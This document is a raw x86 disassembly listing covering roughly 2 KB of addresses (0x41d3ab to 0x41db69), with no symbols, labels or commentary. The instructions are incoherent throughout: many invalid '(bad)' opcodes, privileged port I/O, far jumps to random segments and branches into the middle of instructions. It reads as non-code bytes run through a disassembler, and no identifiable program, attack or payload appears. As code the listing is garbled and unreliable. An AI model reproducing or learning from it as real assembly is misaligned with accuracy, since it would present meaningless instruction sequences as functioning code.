  41d3ab:	call   0x9de5:0x476ceacb
  41d3b2:	stc    
  41d3b3:	dec    eax
  41d3b4:	fwait
  41d3b5:	scas   eax,DWORD PTR es:[edi]
  41d3b6:	shl    BYTE PTR [edi+0x6a],cl
  41d3b9:	popa   
  41d3ba:	mov    bl,0x4c
  41d3bc:	aam    0x34
  41d3be:	xor    DWORD PTR [esi],edi
  41d3c0:	in     al,dx
  41d3c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3c2:	push   ds
  41d3c3:	inc    esp
  41d3c4:	mov    dh,0x1b
  41d3c6:	cwde   
  41d3c7:	jnp    0x41d425
  41d3c9:	jg     0x41d3f7
  41d3cb:	jb     0x41d3ed
  41d3cd:	push   ds
  41d3ce:	and    al,0x48
  41d3d0:	clc    
  41d3d1:	iret   
  41d3d2:	and    dl,BYTE PTR [ebx]
  41d3d4:	(bad)  
  41d3d5:	loope  0x41d3b7
  41d3d7:	mov    al,0x9d
  41d3d9:	enter  0x3de8,0x6d
  41d3dd:	sbb    esp,DWORD PTR [eax+0x4b]
  41d3e0:	pop    ebx
  41d3e1:	pop    edi
  41d3e2:	sbb    edi,DWORD PTR [edx+0xadedda2]
  41d3e8:	sub    eax,0x84c1c95a
  41d3ed:	inc    eax
  41d3ee:	cmp    eax,0xc3016b9
  41d3f3:	cmp    ecx,ecx
  41d3f5:	mov    ebx,0x8efb06bb
  41d3fa:	sbb    DWORD PTR [ebx],esi
  41d3fc:	add    esi,DWORD PTR [edi-0x50]
  41d3ff:	fdiv   QWORD PTR [ecx+0x6d]
  41d402:	mov    ch,0x94
  41d404:	int3   
  41d405:	and    al,0xa
  41d407:	dec    ebx
  41d408:	mov    bh,0xee
  41d40a:	adc    al,0x43
  41d40c:	sbb    eax,ecx
  41d40e:	jnp    0x41d46f
  41d410:	jmpw   0x34e7
  41d414:	(bad)  
  41d415:	out    dx,eax
  41d416:	push   esi
  41d417:	jno    0x41d3ba
  41d419:	(bad)  
  41d41a:	ins    DWORD PTR es:[edi],dx
  41d41b:	cld    
  41d41c:	hlt    
  41d41d:	cmp    DWORD PTR [ebx+0x772d7c27],eax
  41d423:	fdiv   st(2),st
  41d425:	xchg   edi,eax
  41d426:	inc    ebx
  41d427:	iret   
  41d428:	cmp    esp,edi
  41d42a:	xor    eax,0x99e5108a
  41d42f:	inc    ebx
  41d430:	push   0xc53ea4e1
  41d435:	mov    DWORD PTR [edi-0x2e69d0a3],0xd88644c3
  41d43f:	aam    0xf9
  41d441:	adc    al,0x57
  41d443:	add    al,0x9a
  41d445:	and    DWORD PTR [edx+0x4d],eax
  41d448:	call   0x5f58:0xc64e557f
  41d44f:	test   eax,0x1c7aaae4
  41d454:	out    0xe9,eax
  41d456:	mov    BYTE PTR [eax-0x2f],cl
  41d459:	mov    ecx,0x55d74e63
  41d45e:	out    0xf1,al
  41d460:	ret    0x719
  41d463:	adc    ecx,edx
  41d465:	cmp    eax,0xf4455394
  41d46a:	loopne 0x41d46d
  41d46c:	jns    0x41d4e3
  41d46e:	(bad)  
  41d46f:	adc    BYTE PTR [eax+eax*8-0x5f52cdd],ch
  41d476:	ret    
  41d477:	dec    ebp
  41d478:	test   edx,esp
  41d47a:	call   0x96e06d51
  41d47f:	pop    ecx
  41d480:	pop    ss
  41d481:	mov    ds:0xf5ef4e00,al
  41d486:	nop
  41d487:	sub    ebp,ecx
  41d489:	fcmovnb st,st(4)
  41d48b:	xchg   ebx,eax
  41d48c:	(bad)  [edi+0x7c]
  41d48f:	nop
  41d490:	fnstsw WORD PTR [edi-0x5f]
  41d493:	inc    ecx
  41d494:	loop   0x41d4c9
  41d496:	mov    edx,0xa327a2d8
  41d49b:	mov    eax,ds:0x82d8d2e6
  41d4a0:	(bad)  
  41d4a1:	imul   ecx,eax,0x5e3a6b8f
  41d4a7:	xchg   esi,eax
  41d4a8:	pop    ecx
  41d4a9:	pop    eax
  41d4aa:	popf   
  41d4ab:	out    dx,al
  41d4ac:	xor    DWORD PTR [ebx-0x29adcb76],esi
  41d4b2:	pusha  
  41d4b3:	aam    0x51
  41d4b5:	sbb    eax,0xf6e2c915
  41d4ba:	cwde   
  41d4bb:	add    al,0x57
  41d4bd:	arpl   WORD PTR [ebx+0x1e],dx
  41d4c0:	lods   eax,DWORD PTR ds:[esi]
  41d4c1:	add    ebx,ebp
  41d4c3:	imul   edi,DWORD PTR [eax+esi*2],0x45
  41d4c7:	jmp    0x41d450
  41d4c9:	out    dx,al
  41d4ca:	sbb    edi,DWORD PTR [edx+0x2a]
  41d4cd:	(bad)  
  41d4ce:	push   0x15
  41d4d0:	(bad)  
  41d4d1:	cmp    eax,0x8f62b571
  41d4d6:	outs   dx,DWORD PTR ds:[esi]
  41d4d7:	mov    dh,0xf3
  41d4d9:	sbb    eax,DWORD PTR [ebx]
  41d4db:	shr    ebp,0x61
  41d4de:	in     eax,0x22
  41d4e0:	mov    edi,0x28034c76
  41d4e5:	loope  0x41d4ba
  41d4e7:	push   cs
  41d4e8:	std    
  41d4e9:	inc    ebx
  41d4ea:	pop    edx
  41d4eb:	sub    al,0xc5
  41d4ed:	push   0xffffff84
  41d4ef:	push   0xffffffe9
  41d4f1:	or     BYTE PTR [eax],cl
  41d4f3:	pop    edx
  41d4f4:	xchg   BYTE PTR [ecx-0x50a8f668],ch
  41d4fa:	daa    
  41d4fb:	mov    ecx,DWORD PTR [ecx-0x36]
  41d4fe:	mov    al,0x21
  41d500:	fiadd  DWORD PTR [edx-0x6]
  41d503:	mov    edx,0xb13a7174
  41d508:	test   BYTE PTR [ebx+esi*1+0x63],dl
  41d50c:	scas   al,BYTE PTR es:[edi]
  41d50d:	sub    al,0x4b
  41d50f:	adc    ecx,ecx
  41d511:	adc    esp,edi
  41d513:	inc    edx
  41d514:	or     al,bl
  41d516:	retf   
  41d517:	je     0x41d51f
  41d519:	hlt    
  41d51a:	loop   0x41d57b
  41d51c:	mov    ch,0x92
  41d51e:	scas   al,BYTE PTR es:[edi]
  41d51f:	in     al,0x94
  41d521:	mov    al,ds:0x1608593
  41d526:	jo     0x41d4d3
  41d528:	mov    edi,0x9a89c9a2
  41d52d:	scas   al,BYTE PTR es:[edi]
  41d52e:	call   0x11:0x8d9943e
  41d535:	xor    ecx,DWORD PTR [ebx-0x80]
  41d538:	(bad)  
  41d539:	clc    
  41d53a:	adc    eax,0xec6726f1
  41d53f:	sub    DWORD PTR [ecx],0x7d
  41d542:	aad    0x0
  41d544:	jecxz  0x41d538
  41d546:	ins    BYTE PTR es:[edi],dx
  41d547:	add    dl,bh
  41d549:	retf   0x8f47
  41d54c:	(bad)  
  41d54d:	cmp    eax,0x7b3a04c2
  41d552:	test   DWORD PTR [ebp-0x1167c08],esp
  41d558:	ds sti 
  41d55a:	(bad)  
  41d55b:	(bad)  
  41d55c:	int    0xf6
  41d55e:	call   FWORD PTR [eax+0x4b]
  41d561:	test   DWORD PTR [ecx],eax
  41d563:	fstp   st(3)
  41d565:	(bad)  
  41d566:	pop    edx
  41d567:	imul   esp,DWORD PTR [edx+0x7856b72],0xba8d60dc
  41d571:	push   0x31
  41d573:	mov    ebx,0x3ed82a1b
  41d578:	mov    dl,0x6e
  41d57a:	es xor bl,ch
  41d57d:	int    0x4
  41d57f:	gs dec eax
  41d581:	pop    edi
  41d582:	jmp    0xc8c5:0xd6a510f0
  41d589:	mov    ecx,0x3856dae4
  41d58e:	ret    0xc145
  41d591:	push   0x7a
  41d593:	bound  esp,QWORD PTR [edx-0x76]
  41d596:	mov    dh,0x1c
  41d598:	and    esi,DWORD PTR [edi+ecx*1+0x506770b9]
  41d59f:	ret    
  41d5a0:	mov    bl,BYTE PTR [esp+eiz*2-0x5b00312b]
  41d5a7:	das    
  41d5a8:	mov    dh,0x51
  41d5aa:	mov    ah,0x46
  41d5ac:	inc    ebx
  41d5ad:	cdq    
  41d5ae:	pop    eax
  41d5af:	test   al,0x59
  41d5b1:	sar    DWORD PTR [eax],1
  41d5b3:	push   ebp
  41d5b4:	out    dx,eax
  41d5b5:	inc    edi
  41d5b6:	mov    BYTE PTR [eax+0x124788fa],dh
  41d5bc:	rcl    DWORD PTR [edi],cl
  41d5be:	call   0xc3d5:0x94ac472b
  41d5c5:	xchg   ecx,eax
  41d5c6:	xlat   BYTE PTR ds:[ebx]
  41d5c7:	xchg   edx,eax
  41d5c8:	aam    0x82
  41d5ca:	mov    dl,0xc8
  41d5cc:	push   0xa777d97d
  41d5d1:	add    DWORD PTR [ecx],edi
  41d5d3:	mov    ds:0xd3b3df2d,eax
  41d5d8:	das    
  41d5d9:	scas   eax,DWORD PTR es:[edi]
  41d5da:	sar    DWORD PTR [ebx-0x32b0491e],0x2
  41d5e1:	mov    al,0xd2
  41d5e3:	fdiv   st,st(5)
  41d5e5:	xchg   edi,eax
  41d5e6:	addr16 (bad) 
  41d5e8:	lea    edi,[esi]
  41d5ea:	xchg   edi,eax
  41d5eb:	pusha  
  41d5ec:	push   edx
  41d5ed:	and    bl,BYTE PTR [ebp+0x29]
  41d5f0:	popf   
  41d5f1:	and    eax,0x41543952
  41d5f6:	es push 0x59
  41d5f9:	mov    BYTE PTR [ecx+0x3c],dl
  41d5fc:	ror    DWORD PTR [edx],cl
  41d5fe:	cmc    
  41d5ff:	mov    eax,ds:0xaba5c82b
  41d604:	adc    al,0x28
  41d606:	mov    eax,0xe777560e
  41d60b:	mov    ch,0x20
  41d60d:	sar    DWORD PTR [ebx+0x2],0x4d
  41d611:	xor    bh,BYTE PTR [ebp+0x47]
  41d614:	pushf  
  41d615:	aam    0x7d
  41d617:	xchg   edx,eax
  41d618:	push   edi
  41d619:	fwait
  41d61a:	mov    eax,ds:0x5acc1441
  41d61f:	push   ecx
  41d620:	or     edi,0x574d0eaa
  41d626:	enter  0xf77d,0x95
  41d62a:	cmp    al,0x29
  41d62c:	loopne 0x41d5eb
  41d62e:	nop
  41d62f:	sbb    dh,BYTE PTR [edi+0x4291a4f0]
  41d635:	xchg   cl,al
  41d637:	scas   al,BYTE PTR es:[edi]
  41d638:	push   ebx
  41d639:	icebp  
  41d63a:	mov    DWORD PTR [edx-0x26],esi
  41d63d:	xor    DWORD PTR [ecx],0xfddc86e6
  41d643:	or     dl,BYTE PTR [eax+0x2b2a35be]
  41d649:	jns    0x41d67f
  41d64b:	jo     0x41d66d
  41d64d:	sbb    al,0xb0
  41d64f:	enter  0x379,0x57
  41d653:	popf   
  41d654:	xchg   ecx,eax
  41d655:	add    esp,DWORD PTR [edi-0x712c1b4d]
  41d65b:	mov    edx,0xe5455546
  41d660:	sbb    ah,cl
  41d662:	xchg   edi,eax
  41d663:	gs (bad) 
  41d665:	mov    ebp,DWORD PTR [ebx-0x55]
  41d668:	mov    ebx,DWORD PTR [eax]
  41d66a:	adc    ecx,edi
  41d66c:	jno    0x41d695
  41d66e:	and    DWORD PTR [ecx-0x19b6a5c],0x97e3b541
  41d678:	fiadd  WORD PTR [esi+0x49]
  41d67b:	rol    BYTE PTR [edx],cl
  41d67d:	mov    esi,0xda8e7095
  41d682:	jmp    0x1aec:0xbd26b1b4
  41d689:	cmp    DWORD PTR [ecx+ebp*8-0x651a202],eax
  41d690:	je     0x41d669
  41d692:	cwde   
  41d693:	inc    esi
  41d694:	adc    ch,bl
  41d696:	repz mov dl,0xe2
  41d699:	inc    esi
  41d69a:	mov    cs,WORD PTR [edx-0x16344a51]
  41d6a0:	leave  
  41d6a1:	enter  0xf640,0xe7
  41d6a5:	push   edi
  41d6a6:	or     ecx,DWORD PTR [ebp-0x78]
  41d6a9:	jns    0x41d68e
  41d6ab:	ret    
  41d6ac:	test   eax,0x23b1a84
  41d6b1:	fsub   QWORD PTR [edx-0x30]
  41d6b4:	jbe    0x41d685
  41d6b6:	aam    0xb3
  41d6b8:	add    eax,0x217c23ab
  41d6bd:	sub    cl,BYTE PTR [eax-0x760d1b00]
  41d6c3:	push   ss
  41d6c4:	xchg   ebp,eax
  41d6c5:	icebp  
  41d6c6:	sbb    bl,BYTE PTR [edi]
  41d6c8:	retf   0x1858
  41d6cb:	adc    al,0x18
  41d6cd:	xor    cl,BYTE PTR [edx+edi*2+0xb]
  41d6d1:	in     eax,dx
  41d6d2:	adc    al,0x44
  41d6d4:	lock cli 
  41d6d6:	mov    esi,DWORD PTR [eax+eiz*4]
  41d6d9:	stos   DWORD PTR es:[edi],eax
  41d6da:	mov    dl,0xbd
  41d6dc:	inc    eax
  41d6dd:	sub    ah,BYTE PTR [esp+eax*8-0x8288971]
  41d6e4:	xor    BYTE PTR [ecx-0x306c1376],ah
  41d6ea:	dec    ebx
  41d6eb:	xchg   edx,eax
  41d6ec:	arpl   WORD PTR [edi+0x242b4ebd],si
  41d6f2:	jmp    0x41d690
  41d6f4:	sbb    eax,0xa2eb47fb
  41d6f9:	cmp    BYTE PTR [edx-0x6a1f6427],0x0
  41d700:	fcmovne st,st(7)
  41d702:	in     al,0x5e
  41d704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d705:	fcomp  DWORD PTR [edx+0x7e85a115]
  41d70b:	mov    DWORD PTR [ebx-0x4d],ebp
  41d70e:	out    0xbe,al
  41d710:	inc    ebp
  41d711:	sbb    BYTE PTR [esi+0x1578bf6b],al
  41d717:	pop    ecx
  41d718:	loop   0x41d6fa
  41d71a:	xor    DWORD PTR [esi],edx
  41d71c:	stos   DWORD PTR es:[edi],eax
  41d71d:	pop    esp
  41d71e:	lds    edx,FWORD PTR [eax]
  41d720:	stos   DWORD PTR es:[edi],eax
  41d721:	adc    BYTE PTR [edx],dl
  41d723:	sbb    al,0xc4
  41d725:	ins    BYTE PTR es:[edi],dx
  41d726:	push   esp
  41d727:	test   DWORD PTR [edx],edi
  41d729:	and    esp,ebp
  41d72b:	dec    esp
  41d72c:	sti    
  41d72d:	into   
  41d72e:	retf   
  41d72f:	dec    ecx
  41d730:	mov    ecx,DWORD PTR [edx+0x59b85ab9]
  41d736:	stos   BYTE PTR es:[edi],al
  41d737:	jb     0x41d6fc
  41d739:	xchg   ecx,eax
  41d73a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d73b:	add    al,0x5a
  41d73d:	call   0xc2e87d9d
  41d742:	dec    eax
  41d743:	les    ebp,FWORD PTR [ecx+0x59170b03]
  41d749:	lds    edi,FWORD PTR [esi-0x3a]
  41d74c:	pop    es
  41d74d:	cld    
  41d74e:	das    
  41d74f:	jecxz  0x41d719
  41d751:	push   edi
  41d752:	clc    
  41d753:	mov    bh,0x2f
  41d755:	adc    cl,dl
  41d757:	stc    
  41d758:	outs   dx,BYTE PTR ds:[esi]
  41d759:	and    ecx,0xffffff9f
  41d75c:	sbb    eax,ebx
  41d75e:	test   eax,0x138f1168
  41d763:	add    eax,DWORD PTR [ebp+0x12]
  41d766:	xchg   esi,eax
  41d767:	or     BYTE PTR [esi],bh
  41d769:	dec    edi
  41d76a:	repnz shl BYTE PTR [edi-0x5db0dc4a],1
  41d771:	push   ss
  41d772:	push   ds
  41d773:	push   ds
  41d774:	dec    ebx
  41d775:	mov    ah,0x4d
  41d777:	fadd   DWORD PTR es:[ecx]
  41d77a:	leave  
  41d77b:	out    dx,al
  41d77c:	add    DWORD PTR [edi],edx
  41d77e:	pushf  
  41d77f:	bound  edi,QWORD PTR [eax]
  41d781:	int3   
  41d782:	jp     0x41d72a
  41d784:	dec    ebp
  41d785:	xchg   edi,eax
  41d786:	pushf  
  41d787:	ror    ebx,0x5a
  41d78a:	xor    al,0x62
  41d78c:	in     eax,0x8d
  41d78e:	sbb    eax,0xda62d51
  41d793:	ror    DWORD PTR [ecx],cl
  41d795:	fs mov edx,0xa553ba77
  41d79b:	push   ss
  41d79c:	jmp    DWORD PTR [esi]
  41d79e:	jp     0x41d772
  41d7a0:	lahf   
  41d7a1:	mov    al,0x6
  41d7a3:	cs cmp al,0xca
  41d7a6:	mov    edx,0x9800731
  41d7ab:	sub    esp,ecx
  41d7ad:	retf   
  41d7ae:	jo     0x41d82e
  41d7b0:	xor    eax,0xa88758f8
  41d7b5:	mov    esp,0x76480a1d
  41d7ba:	cmp    eax,0x9598ea9
  41d7bf:	imul   ecx,esp,0xaf62a850
  41d7c5:	rcl    bh,0xc2
  41d7c8:	xor    DWORD PTR [edx-0x64e0d21e],0xffffff93
  41d7cf:	popf   
  41d7d0:	(bad)  
  41d7d1:	hlt    
  41d7d2:	aas    
  41d7d3:	mov    cl,0x4f
  41d7d5:	loope  0x41d75f
  41d7d7:	jae    0x41d75c
  41d7d9:	mov    edi,0xcda49054
  41d7de:	in     eax,dx
  41d7df:	jge    0x41d843
  41d7e1:	fild   DWORD PTR [edi+0x24ef62fb]
  41d7e7:	push   0x87aed06e
  41d7ec:	xor    al,0x1e
  41d7ee:	call   0x436149db
  41d7f3:	mov    ebx,0xf0747ef8
  41d7f8:	sub    dl,BYTE PTR [edx-0x871ae1d]
  41d7fe:	pop    ds
  41d7ff:	jmp    0x306dde26
  41d804:	dec    esp
  41d805:	inc    esp
  41d806:	sub    eax,0xcc55b976
  41d80b:	inc    eax
  41d80c:	in     eax,0x56
  41d80e:	sbb    eax,0x7732d1a9
  41d813:	add    bh,BYTE PTR [edi]
  41d815:	and    DWORD PTR [ecx-0x6f],0xc11056eb
  41d81c:	ror    al,1
  41d81e:	push   esi
  41d81f:	xor    DWORD PTR [ecx-0x73],ecx
  41d822:	push   es
  41d823:	xchg   edx,eax
  41d824:	jne    0x41d7b6
  41d826:	mov    ch,dh
  41d828:	lea    esi,[eax+0x69d42389]
  41d82e:	or     DWORD PTR [esi],edi
  41d830:	mov    edx,0x6ed06f60
  41d835:	cwde   
  41d836:	cmp    edi,0x435c4e7e
  41d83c:	aaa    
  41d83d:	dec    edi
  41d83e:	sbb    al,0x1d
  41d840:	(bad)  
  41d842:	mov    dl,0x9
  41d844:	idiv   bl
  41d846:	add    ecx,DWORD PTR [ebp-0x5f]
  41d849:	sahf   
  41d84a:	adc    bh,0x36
  41d84d:	jmp    0x4a6b53d2
  41d852:	cmp    DWORD PTR [eax+0x360344d7],edx
  41d858:	out    dx,eax
  41d859:	mov    cl,dl
  41d85b:	fcmove st,st(4)
  41d85d:	jnp    0x41d7df
  41d85f:	mov    eax,esp
  41d861:	and    DWORD PTR [ecx-0x3402b2dc],esp
  41d867:	jne    0x41d8b8
  41d869:	or     cl,BYTE PTR [edi-0x74882157]
  41d86f:	push   0xffffffd9
  41d871:	push   edi
  41d872:	jae    0x41d842
  41d874:	or     ah,BYTE PTR [edi+0x2b]
  41d877:	loopne 0x41d87b
  41d879:	sbb    DWORD PTR [eax-0x13569923],edi
  41d87f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d880:	pop    es
  41d881:	cdq    
  41d882:	scas   eax,DWORD PTR es:[edi]
  41d883:	pop    ds
  41d884:	rcl    DWORD PTR [edx],cl
  41d886:	cmp    edx,DWORD PTR [ecx-0x48]
  41d889:	and    al,0x23
  41d88b:	adc    eax,DWORD PTR [edx]
  41d88d:	dec    edi
  41d88e:	xchg   esp,eax
  41d88f:	xchg   ebp,eax
  41d890:	call   0x187:0x66f7799e
  41d897:	pop    ss
  41d898:	or     DWORD PTR [esi+0x452fd7aa],0x6
  41d89f:	inc    ecx
  41d8a0:	xor    eax,0xa75e2b3c
  41d8a5:	dec    esp
  41d8a6:	jp     0x41d8c5
  41d8a8:	shr    DWORD PTR [edi+0x1f85b336],0x49
  41d8af:	leave  
  41d8b0:	sbb    ecx,ebx
  41d8b2:	cli    
  41d8b3:	clc    
  41d8b4:	mov    edi,0x1bd9a741
  41d8b9:	rcr    ah,1
  41d8bb:	pop    esp
  41d8bc:	sub    al,BYTE PTR [esi-0x4e]
  41d8bf:	fs pop ecx
  41d8c1:	jnp    0x41d8c0
  41d8c3:	data16 in al,0x19
  41d8c6:	push   esp
  41d8c7:	push   esp
  41d8c8:	mov    al,ds:0x61935393
  41d8cd:	xor    eax,0x843f51c9
  41d8d2:	fmul   DWORD PTR [edx-0x71]
  41d8d5:	mov    edx,0x65806dce
  41d8da:	fst    DWORD PTR [ebp+0x1ab221]
  41d8e0:	mov    edx,0x33aa301a
  41d8e5:	jns    0x41d8ff
  41d8e7:	xor    BYTE PTR [esi+0xc],bh
  41d8ea:	(bad)  
  41d8eb:	sbb    bh,dl
  41d8ed:	nop
  41d8ee:	iret   
  41d8ef:	xchg   ecx,eax
  41d8f0:	stos   BYTE PTR es:[edi],al
  41d8f1:	in     eax,dx
  41d8f2:	(bad)  
  41d8f3:	sbb    ebx,DWORD PTR [edi+0x1b2cc59e]
  41d8f9:	std    
  41d8fa:	inc    esp
  41d8fb:	xor    edi,0xfffffff5
  41d8fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8ff:	pop    ebx
  41d900:	xchg   esi,eax
  41d901:	and    eax,0xe9c1c187
  41d906:	mov    ecx,0x1ae1ba27
  41d90b:	push   0xc5347dba
  41d910:	mov    esi,0x84109fd6
  41d915:	inc    DWORD PTR ds:0x5aa98498
  41d91b:	push   ss
  41d91c:	mov    dl,BYTE PTR [ebp+0x47]
  41d91f:	adc    al,0x4
  41d921:	inc    ebp
  41d922:	pop    eax
  41d923:	das    
  41d924:	push   0x0
  41d926:	xchg   edi,eax
  41d927:	xchg   edi,eax
  41d928:	mov    dh,0x56
  41d92a:	sub    eax,0x6a1fee8e
  41d92f:	mov    bh,0x6f
  41d931:	nop
  41d932:	sbb    DWORD PTR [eax+0x248813f6],ebx
  41d938:	inc    edx
  41d939:	loop   0x41d8f2
  41d93b:	(bad)  
  41d93c:	cmp    DWORD PTR [esi],ebp
  41d93e:	in     al,0x47
  41d940:	xchg   DWORD PTR [ebx+0x13758369],esi
  41d946:	mov    edi,0xf328e99d
  41d94b:	adc    BYTE PTR [edi+0x2],bl
  41d94e:	loop   0x41d9c1
  41d950:	arpl   sp,ax
  41d952:	inc    ebp
  41d953:	or     BYTE PTR [esi+0x2b],0x8c
  41d957:	vpsignd xmm2,xmm4,XMMWORD PTR [ebp-0x22969a7c]
  41d960:	in     eax,0xb6
  41d962:	jnp    0x41d975
  41d964:	inc    ebx
  41d965:	pop    ebp
  41d966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d967:	outs   dx,DWORD PTR ds:[esi]
  41d968:	jecxz  0x41d981
  41d96a:	in     eax,0x4f
  41d96c:	or     DWORD PTR [ebx-0x61],edx
  41d96f:	rcl    DWORD PTR [esi],1
  41d971:	pop    esi
  41d972:	test   BYTE PTR ds:0x105c283c,0x8a
  41d979:	adc    DWORD PTR [eax+0x5],0xb870a8e2
  41d980:	sbb    eax,0x4dcb2b13
  41d985:	push   edi
  41d986:	jmp    0x41d96d
  41d988:	fnstcw WORD PTR [ecx+0x47f05bb6]
  41d98e:	sub    al,0x7d
  41d990:	dec    esp
  41d991:	outs   dx,DWORD PTR ds:[esi]
  41d992:	cld    
  41d993:	es or  al,0xd6
  41d996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d997:	sub    BYTE PTR [esi-0x4a],ch
  41d99a:	fsubp  st(5),st
  41d99c:	das    
  41d99d:	enter  0xa4fe,0x3a
  41d9a1:	sar    dh,cl
  41d9a3:	or     al,cl
  41d9a5:	mov    edi,0x29a54624
  41d9aa:	fnstenv [edx]
  41d9ac:	aad    0xc9
  41d9ae:	popa   
  41d9af:	cdq    
  41d9b0:	loope  0x41d9f4
  41d9b2:	les    esi,FWORD PTR [ecx]
  41d9b4:	jp     0x41d9f1
  41d9b6:	adc    al,0x63
  41d9b8:	mov    bh,0x4e
  41d9ba:	fcomp  QWORD PTR [edi+esi*8]
  41d9bd:	sub    eax,0x489aa534
  41d9c2:	mov    esi,0x297e19b
  41d9c7:	mov    bh,0x44
  41d9c9:	xor    ebp,DWORD PTR [ecx+0x7ee0ac3a]
  41d9cf:	add    dh,BYTE PTR [edi]
  41d9d1:	jne    0x41d9b4
  41d9d3:	smsw   WORD PTR [edi]
  41d9d6:	retf   0x951c
  41d9d9:	mov    ecx,0xb823ffaa
  41d9de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9df:	mov    edx,0x146fa509
  41d9e4:	(bad)  
  41d9e5:	cld    
  41d9e6:	push   ebx
  41d9e7:	add    BYTE PTR [edx],bh
  41d9e9:	jl     0x41da1a
  41d9eb:	jl     0x41d9fd
  41d9ed:	mov    ch,0x2b
  41d9ef:	es and eax,0x7dc87300
  41d9f5:	dec    edx
  41d9f6:	imul   esi,edx,0x6c744b19
  41d9fc:	jle    0x41da09
  41d9fe:	fdiv   DWORD PTR ds:0xeb286fc6
  41da04:	xchg   BYTE PTR [esi+0x20],al
  41da07:	mov    dh,0x7e
  41da09:	cmp    al,0x64
  41da0b:	inc    edx
  41da0c:	sub    BYTE PTR [edx+eiz*8+0x7527fbf0],ah
  41da13:	sub    BYTE PTR [eax+ecx*4-0x63e0e80a],al
  41da1a:	sub    BYTE PTR [eax-0x6b93601e],ah
  41da20:	jb     0x41da65
  41da22:	in     al,dx
  41da23:	push   DWORD PTR [ebp-0xfe7da14]
  41da29:	rcl    DWORD PTR [edx+0x1c],1
  41da2c:	jle    0x7ab802b0
  41da32:	in     eax,dx
  41da33:	adc    al,0x74
  41da35:	jns    0x41da79
  41da37:	fdivr  QWORD PTR [ecx+ecx*8+0x78]
  41da3b:	mov    eax,0x15809323
  41da40:	push   ebx
  41da41:	pop    es
  41da42:	lods   al,BYTE PTR ds:[esi]
  41da43:	lds    ebp,FWORD PTR [edx]
  41da45:	loope  0x41da43
  41da47:	dec    ebp
  41da48:	adc    DWORD PTR [ebx-0x1c61c545],esi
  41da4e:	pushf  
  41da4f:	push   edx
  41da50:	addr16 popa 
  41da52:	test   eax,0x173b0732
  41da57:	out    dx,eax
  41da58:	cmp    BYTE PTR [edx+0x9],0xde
  41da5c:	mov    dl,0xe8
  41da5e:	sub    dh,dl
  41da60:	push   cs
  41da61:	je     0x41da6f
  41da63:	pop    ds
  41da64:	loop   0x41d9fa
  41da66:	inc    ebx
  41da67:	in     eax,dx
  41da68:	loope  0x41da44
  41da6a:	int3   
  41da6b:	out    0xe6,al
  41da6d:	pop    edi
  41da6e:	cmp    al,0x27
  41da71:	pop    ebx
  41da72:	je     0x41da48
  41da74:	cdq    
  41da75:	out    0xcb,al
  41da77:	or     ecx,edi
  41da79:	or     ebp,DWORD PTR ds:0x8a4bb6a
  41da7f:	and    al,0x63
  41da81:	enter  0xaab,0xad
  41da85:	sub    eax,0xfa5de14d
  41da8a:	mov    esi,0x782fb64a
  41da8f:	mov    al,ds:0xcc4f4aa2
  41da94:	test   eax,0xd3f01974
  41da99:	in     eax,dx
  41da9a:	arpl   WORD PTR [ecx-0x1b],sp
  41da9d:	call   0xb24521ad
  41daa2:	pop    ss
  41daa3:	jmp    0x9e22:0x4997c406
  41daaa:	dec    esp
  41daab:	sub    DWORD PTR [edx+0x48],0x6218dc82
  41dab2:	inc    esp
  41dab3:	xor    DWORD PTR [edi-0x65],ecx
  41dab6:	dec    esp
  41dab7:	fsubp  st(2),st
  41dab9:	call   0x28da1064
  41dabe:	push   eax
  41dabf:	in     al,0x6a
  41dac1:	outs   dx,BYTE PTR ds:[esi]
  41dac2:	aaa    
  41dac3:	xor    ebp,eax
  41dac5:	lods   eax,DWORD PTR ds:[esi]
  41dac6:	out    0x9d,eax
  41dac8:	pusha  
  41dac9:	call   0xa150:0x44656516
  41dad0:	ror    DWORD PTR [ecx-0x59e8f82e],0xe
  41dad7:	jmp    0x82d0fc49
  41dadc:	xchg   esp,eax
  41dadd:	cmp    al,0x7d
  41dadf:	pop    es
  41dae0:	jle    0x41daa2
  41dae2:	xchg   edx,eax
  41dae3:	retf   
  41dae4:	fmul   st,st(2)
  41dae6:	ins    BYTE PTR es:[edi],dx
  41dae7:	sub    eax,0x20171558
  41daec:	push   esi
  41daed:	and    ebx,DWORD PTR [ebx-0x13d4500f]
  41daf3:	clc    
  41daf4:	aaa    
  41daf5:	mov    ds:0xeb629f01,al
  41dafa:	popa   
  41dafb:	test   edx,ecx
  41dafd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafe:	imul   ebx,DWORD PTR [ecx],0xffffffa7
  41db01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db02:	sbb    eax,0x25a7a120
  41db07:	sahf   
  41db08:	jmp    0x41dafa
  41db0a:	push   ebx
  41db0b:	dec    ecx
  41db0c:	retf   0xd39
  41db0f:	jno    0x41db7c
  41db11:	jno    0x41db72
  41db13:	or     BYTE PTR [eax+esi*2],cl
  41db16:	fmul   DWORD PTR [ecx-0x7b30d8ce]
  41db1c:	dec    esp
  41db1d:	jmp    0x41dad0
  41db1f:	jmp    0x3305:0xc9ef04ca
  41db26:	enter  0x124f,0x10
  41db2a:	popf   
  41db2b:	aaa    
  41db2c:	push   esi
  41db2d:	shl    DWORD PTR [esi],0xc9
  41db30:	sub    eax,0x581acf0
  41db35:	ins    BYTE PTR es:[edi],dx
  41db36:	cmp    DWORD PTR [ebx+0x31ec154e],eax
  41db3c:	into   
  41db3d:	retf   
  41db3e:	pop    edi
  41db3f:	or     al,BYTE PTR [edi-0x193d0990]
  41db45:	mov    bl,BYTE PTR [ebp+0x4e]
  41db48:	(bad)  
  41db49:	arpl   sp,bp
  41db4b:	mov    ?,WORD PTR [ecx+0x13389f4d]
  41db51:	push   cs
  41db52:	int    0x7a
  41db54:	xchg   ebp,eax
  41db55:	cld    
  41db56:	jle    0x41db92
  41db58:	ror    DWORD PTR [ebx-0x214e56a5],1
  41db5e:	jmp    0x893558c5
  41db63:	sysexit 
  41db65:	pop    ss
  41db66:	push   ecx
  41db68:	dec    edi
  41db69:	out    dx,al
